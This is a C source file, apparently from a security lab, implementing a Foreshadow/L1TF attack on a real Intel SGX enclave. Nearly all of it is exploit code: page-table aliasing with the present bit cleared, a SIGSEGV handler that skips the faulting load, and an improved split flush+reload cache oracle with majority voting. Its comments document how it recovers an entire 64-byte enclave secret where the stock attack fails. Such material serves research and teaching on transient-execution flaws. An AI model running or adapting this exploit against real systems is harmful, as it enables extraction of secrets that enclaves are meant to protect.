/*
 * GGSEC modifications and additions:
 * Copyright (C) 2026 Maciej Gojny, GG Advanced IT Security UG
 */
/*
 *  Foreshadow/L1TF on a REAL enclave, with the leaktest-proven measurement.
 *
 *  Deliverable (b). This is the upstream app/foreshadow attack (EENTER, real
 *  EPC secret, alias PTE with the present bit cleared, L1TF transient read),
 *  but the decode uses the split lo/hi oracle that harness/leaktest.c already
 *  validated at 0/64 mismatches on THIS host (i3-6100, 32 KiB / 8-way / 64-set
 *  L1D).
 *
 *  Why the stock app/foreshadow only recovers ~10% here, and why this recovers
 *  the whole line:
 *
 *    - app/foreshadow uses libsgxstep/foreshadow.c, whose oracle is 256 slots
 *      at a 0x1000 stride. On this L1D every slot lands in ONE set
 *      ((addr>>6)&63 advances by 64 == 0 mod 64), and the round decodes with
 *      "flush all 256 -> one transient -> reload all 256 in order". In an 8-way
 *      set the reload of slots 0..secret-1 evicts slot[secret] before it is
 *      measured, so only small byte values survive -- a heavy 0x00 bias and a
 *      single-digit yield.
 *    - The sim/harness path (app/foreshadow-sim) looks fine only because its
 *      SIGSEGV handler re-presents the page and the faulting load re-executes
 *      ARCHITECTURALLY on attacker-owned memory, depositing a strong, repeated
 *      trace. On a real enclave the architectural re-execution reads the abort
 *      page (0xff), not the secret, so the enclave path is purely transient and
 *      fully exposed to the oracle-geometry problem above.
 *
 *  The fix, measured to work here: split the byte into a low-6-bit trace and a
 *  high-2-bit trace, give every class its own L1D set (0x1040 stride), decode
 *  one candidate class at a time (flush slot -> one transient -> reload slot),
 *  and never re-execute the faulting load architecturally (the handler skips
 *  RIP past the block). The only enclave-specific change vs leaktest.c is the
 *  priming: the real secret can be brought into L1D only by the enclave itself,
 *  so every round calls enclave_reload() (an ECALL) instead of a plain load of
 *  attacker memory.
 *
 *  Controls (environment variables), same meaning as leaktest.c:
 *    HANDLER=skip|restore   skip (default): never re-execute architecturally.
 *                           restore: old behaviour, for the A/B control only.
 *    PFN=keep|zero          keep (default): PTE keeps the physical address, P=0.
 *                           zero: clear the address too (negative control).
 *    RELOAD=0|1             1 (default): re-enter the enclave to warm the line.
 *                           0: flush it instead (the "no secret in L1D" control).
 *    TRIALS=<n>             repeats with a fresh random secret each trial.
 *    SEED=<n>               only affects the SELFTEST path.
 *    SELFTEST=1             root-free decoder/oracle self-check (no enclave).
 *
 *  Build/run: see labs/foreshadow/README.md, section "Deliverable (b)". Links
 *  against the stock PSW 2.27 runtime exactly like app/foreshadow, reuses that
 *  app's Enclave/ and aep_stub.c.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <sys/mman.h>
#include <ucontext.h>

#include <sgx_urts.h>
#include "Enclave/encl_u.h"

#include "libsgxstep/config.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/cache.h"

/* ------------------------------------------------------------------ oracle */

#define SLOT_SIZE       0x1040 /* 4 KiB + one line: advances the L1D set index by one
                                * per candidate, so each class gets its own set. See
                                * leaktest.c for the measurement that fixes this value. */
#define SECRET_BYTES    64
#define HOT_CYCLES      150    /* diagnostic only; the decode uses argmin */
#define LO_CLASSES      64     /* low six bits  */
#define HI_CLASSES      4      /* high two bits */

char __attribute__ ((aligned(0x1000))) oracle_lo[SLOT_SIZE * LO_CLASSES];
char __attribute__ ((aligned(0x1000))) oracle_hi[SLOT_SIZE * HI_CLASSES];

/* ------------------------------------------------------------- attack state */

#define ENCLAVE_SO      "Enclave/encl.so"
#define DEBUG_ENCLAVE   1

sgx_enclave_id_t eid = 0;
void *secret_ptr = NULL, *secret_page = NULL, *alias_ptr = NULL, *alias_page = NULL;
uint64_t *pte_alias = NULL;
uint64_t pte_present = 0x0;      /* valid PTE: P=1, PFN kept  */
uint64_t pte_keep    = 0x0;      /* P=0, PFN kept            */
uint64_t pte_zero    = 0x0;      /* P=0, PFN cleared         */

static int trials = 1;           /* TRIALS=<n>    */
static int pfn_keep = 1;         /* PFN=keep|zero */
static int reload_secret = 1;    /* RELOAD=0|1    */
static int noblock = 0;          /* NOBLOCK=1     */
static int repeat = 5;           /* REPEAT=<n>: majority vote per byte */

static void *volatile skip_to = NULL;
static volatile unsigned long fault_count = 0;
static int restore_in_handler = 0;

/* --------------------------------------------------------- SIGSEGV handling */

static void fault_handler( int sig, siginfo_t *si, void *ctx )
{
    ucontext_t *uc = (ucontext_t *) ctx;

    fault_count++;

    if (!restore_in_handler)
    {
        /* resume right after the transient block: the oracle access is never
         * executed architecturally (on an enclave it would read 0xff anyway) */
        uc->uc_mcontext.gregs[REG_RIP] = (greg_t) skip_to;
        return;
    }

    /* control only: re-present the page (reads the abort page on an enclave) */
    *pte_alias = MARK_PRESENT(pte_present);
    if (mprotect(alias_page, 0x1000, PROT_READ | PROT_WRITE) != 0)
    {
        const char msg[] = "[encl-split] mprotect failed in handler\n";
        write(STDERR_FILENO, msg, sizeof(msg) - 1);
        _exit(3);
    }
}

/* ---------------------------------------------------------- transient block */
/*
 * One speculative access per run. The handler redirects execution to label 2,
 * i.e. past the secret-dependent oracle access, so only what the out-of-order
 * engine did before the fault leaves a trace. lo and hi must not run in the
 * same round: the two oracles tile the same 64 sets, so one would make the
 * other's candidate look hot.
 */
static inline void leak_round_lo( void *base, void *adrs )
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t"
        "   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t"             /* faults on the revoked mapping */
        "   movzbl %%al, %%eax\n\t"
        "   and $0x3f, %%eax\n\t"             /* low six bits */
        "   imul %3, %%rax\n\t"
        "   movq (%2, %%rax), %%rdi\n\t"      /* data-dependent access into oracle_lo */
        "2:\n\t"
        : "=m"(skip_to)
        : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

static inline void leak_round_hi( void *base, void *adrs )
{
    asm volatile(
        "   lea 2f(%%rip), %%rax\n\t"
        "   mov %%rax, %0\n\t"
        "1: movb (%1), %%al\n\t"
        "   movzbl %%al, %%eax\n\t"
        "   shr $6, %%eax\n\t"                /* high two bits */
        "   imul %3, %%rax\n\t"
        "   movq (%2, %%rax), %%rdi\n\t"      /* data-dependent access into oracle_hi */
        "2:\n\t"
        : "=m"(skip_to)
        : "r"(adrs), "r"(base), "r"((unsigned long) SLOT_SIZE)
        : "rax", "rdi", "memory");
}

/*
 * Bring the enclave secret line back into L1D. The ONLY way to do this for a
 * real enclave is to run enclave code: enclave_reload() is a minimal ECALL that
 * does `movl (secret)`, which pulls the whole 64-byte line into L1D. This is the
 * one line that differs from leaktest.c (which loads attacker memory directly).
 */
static inline void prime_secret_line( void )
{
    SGX_ASSERT( enclave_reload( eid, secret_ptr ) );
}

/* ---------------------------------------------------------------- decoding */

static int decode_trace( void *base, int classes, int high, char *adrs,
                         uint64_t *best_t, uint64_t *second_t, int *hot_count )
{
    int c, best = -1;
    uint64_t t, b = ~0ULL, s = ~0ULL;

    *hot_count = 0;

    for (c = 0; c < classes; c++)
    {
        char *slot = (char *) base + (c * SLOT_SIZE);

        /* 1. re-arm the revoked PTE, 2. warm the secret line in L1D (or keep it
         *    out, as the control), 3. leave this candidate cold */
        *pte_alias = pfn_keep ? pte_keep : pte_zero;
        if (reload_secret)
            prime_secret_line();
        else
            flush(secret_ptr);
        flush(slot);

        /* 4. one transient attempt of the trace we are decoding */
        if (!noblock)
        {
            if (high)
                leak_round_hi(base, adrs);
            else
                leak_round_lo(base, adrs);
        }

        /* 5. a hot candidate means the speculative access went into this class */
        t = reload(slot);
        if (t < HOT_CYCLES)
            (*hot_count)++;
        if (t < b)      { s = b; b = t; best = c; }
        else if (t < s) { s = t; }
    }

    *best_t = b;
    *second_t = s;
    return best;
}

/*
 * Privilege-free stand-in for decode_trace(): the two accesses of the block are
 * performed architecturally instead of faulting. Validates the decoder and the
 * oracle geometry without an enclave or /dev/mem (SELFTEST=1).
 */
static int decode_arch( int value, int high,
                        uint64_t *best_t, uint64_t *second_t, int *hot_count )
{
    void *base = high ? (void *) oracle_hi : (void *) oracle_lo;
    int classes = high ? HI_CLASSES : LO_CLASSES;
    int c, best = -1;
    uint64_t t, b = ~0ULL, s = ~0ULL;

    *hot_count = 0;

    for (c = 0; c < classes; c++)
    {
        char *slot = (char *) base + (c * SLOT_SIZE);

        flush(slot);
        reload((char *) base + (((high ? (value >> 6) : (value & 0x3f))) * SLOT_SIZE));
        t = reload(slot);

        if (t < HOT_CYCLES)
            (*hot_count)++;
        if (t < b)      { s = b; b = t; best = c; }
        else if (t < s) { s = t; }
    }

    *best_t = b;
    *second_t = s;
    return best;
}

/* -------------------------------------------------------------------- main */

int main( int argc, char **argv )
{
    int i, j;
    unsigned seed = (unsigned) time(NULL) ^ (unsigned) getpid();
    struct sigaction sa;
    sgx_launch_token_t token = {0};
    int updated = 0;
    uint8_t real[SECRET_BYTES] = {0x0};
    uint8_t recovered[SECRET_BYTES] = {0x0};

    setvbuf(stdout, NULL, _IOLBF, 0);

    /* ---- SELFTEST: decoder + oracle geometry, no enclave, no privileges ---- */
    if (getenv("SELFTEST"))
    {
        static const int values[] = { 0, 1, 17, 128, 236, 255 };
        int n = (int) (sizeof(values) / sizeof(values[0]));

        {
            char *p = oracle_lo + (7 * SLOT_SIZE);
            unsigned long cold, hot;
            flush(p); cold = reload(p); hot = reload(p);
            info("timing sanity: cold=%lu hot=%lu", cold, hot);
        }
        {
            static char __attribute__ ((aligned(0x1000))) probe_area[SLOT_SIZE * 2];
            unsigned long alone, same_set, other_set;
            flush(probe_area); alone = reload(probe_area);
            flush(probe_area); reload(probe_area + 0x1000); same_set = reload(probe_area);
            flush(probe_area); reload(probe_area + 0x40);   other_set = reload(probe_area);
            info("probe: flush+reload=%lu, +load(same set)+reload=%lu, "
                 "+load(other set)+reload=%lu", alone, same_set, other_set);
        }
        for (i = 0; i < n; i++)
        {
            uint64_t b = 0, s = 0;
            int v = values[i] & 0xff, hot_lo = 0, hot_hi = 0;
            int lo = decode_arch(v, 0, &b, &s, &hot_lo);
            int hi = decode_arch(v, 1, &b, &s, &hot_hi);
            info("selftest: touched=0x%02x lo=%2d (%d hot) hi=%d (%d hot) -> %s",
                 v, lo, hot_lo, hi, hot_hi,
                 (lo == (v & 0x3f) && hi == (v >> 6)) ? "OK" : "MISMATCH");
        }
        return 0;
    }

    if (getenv("HANDLER"))  restore_in_handler = !strcmp(getenv("HANDLER"), "restore");
    if (getenv("PFN"))      pfn_keep = strcmp(getenv("PFN"), "zero");
    if (getenv("RELOAD"))   reload_secret = atoi(getenv("RELOAD"));
    if (getenv("NOBLOCK"))  noblock = atoi(getenv("NOBLOCK"));
    if (getenv("TRIALS"))   trials = atoi(getenv("TRIALS"));
    if (getenv("REPEAT"))   repeat = atoi(getenv("REPEAT"));
    if (getenv("SEED"))     seed = (unsigned) strtoul(getenv("SEED"), NULL, 0);
    if (trials < 1)         trials = 1;
    if (repeat < 1)         repeat = 1;

    info("mode: handler=%s pfn=%s reload=%d block=%s trials=%d repeat=%d",
         restore_in_handler ? "restore" : "skip",
         pfn_keep ? "keep" : "zero", reload_secret, noblock ? "absent" : "present",
         trials, repeat);

    /* ---- real enclave ---- */
    info("Creating enclave...");
    SGX_ASSERT( sgx_create_enclave( ENCLAVE_SO, DEBUG_ENCLAVE,
                                    &token, &updated, &eid, NULL ) );

    ASSERT( !claim_cpu(VICTIM_CPU) );
    ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );

    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO;
    ASSERT( !sigaction(SIGSEGV, &sa, NULL) );

    /* secret + alias (identical to app/foreshadow) */
    SGX_ASSERT( enclave_generate_secret( eid, &secret_ptr ) );
    secret_page = (void *) ((uint64_t) secret_ptr & ~UINT64_C(0xfff));
    alias_ptr  = remap_page_table_level(secret_ptr, PAGE);
    alias_page = (void *) ((uint64_t) alias_ptr & ~UINT64_C(0xfff));
    ASSERT( pte_alias = remap_page_table_level(alias_ptr, PTE) );

    pte_present = *pte_alias;
    pte_keep    = MARK_NOT_PRESENT(pte_present);
    pte_zero    = pte_keep & ~((uint64_t) PT_PHYS_MASK);
    info("enclave secret at %p (page %p); alias at %p; PTE %#lx",
         secret_ptr, secret_page, alias_ptr, pte_present);
    print_pte_adrs(secret_ptr);

    info_event("Foreshadow secret extraction (real enclave, split oracle)");

    for (j = 0; j < trials; j++)
    {
        int mismatch = 0;

        /* fresh random secret per trial */
        SGX_ASSERT( enclave_generate_secret( eid, &secret_ptr ) );

        for (i = 0; i < SECRET_BYTES; i++)
        {
            unsigned long faults_before = fault_count;
            int votes[256] = {0}, r, best = 0;

            /* revoke the alias for this byte: PROT_NONE makes the kernel invert
             * the PTE; decode_trace() then re-arms our own value each round */
            ASSERT( !mprotect(alias_page, 0x1000, PROT_NONE) );

            /*
             * Repeat the whole (lo,hi) measurement and take the majority.
             * A correct read is stable across repeats; the occasional wrong read
             * (the secret line was evicted by the EENTER/EEXIT overhead before
             * the transient, so it leaked 0x00) is random, so the mode is the
             * true byte. This is the paper's repeated-measurement approach.
             */
            for (r = 0; r < repeat; r++)
            {
                uint64_t bt = 0, st = 0, bh = 0, sh = 0;
                int hl = 0, hh = 0;
                int lo = decode_trace(oracle_lo, LO_CLASSES, 0,
                                      (char *) alias_ptr + i, &bt, &st, &hl);
                int hi = decode_trace(oracle_hi, HI_CLASSES, 1,
                                      (char *) alias_ptr + i, &bh, &sh, &hh);
                int b = (lo < 0 || hi < 0) ? 0 : ((hi << 6) | lo);
                votes[b & 0xff]++;
            }
            for (r = 0; r < 256; r++)
                if (votes[r] > votes[best]) best = r;
            recovered[i] = (uint8_t) best;

            info("t%d byte %2d: decoded=0x%02x (votes %d/%d) faults=%lu",
                 j, i, (uint8_t) best, votes[best], repeat,
                 fault_count - faults_before);

            /* make the page usable again for the next byte */
            *pte_alias = pte_present;
            ASSERT( !mprotect(alias_page, 0x1000, PROT_READ | PROT_WRITE) );
        }

        /* verify against the true secret (this destroys it) */
        SGX_ASSERT( enclave_destroy_secret( eid, real ) );
        for (i = 0; i < SECRET_BYTES; i++)
            if (recovered[i] != real[i])
                mismatch++;

        if (mismatch)
            info("[FAIL] trial %d: missed %d bytes out of %d", j, mismatch, SECRET_BYTES);
        else
            info("[OK] trial %d: recovered all %d bytes!", j, SECRET_BYTES);
    }

    info("handled SIGSEGV total = %lu", fault_count);
    restore_system_state();
    return 0;
}
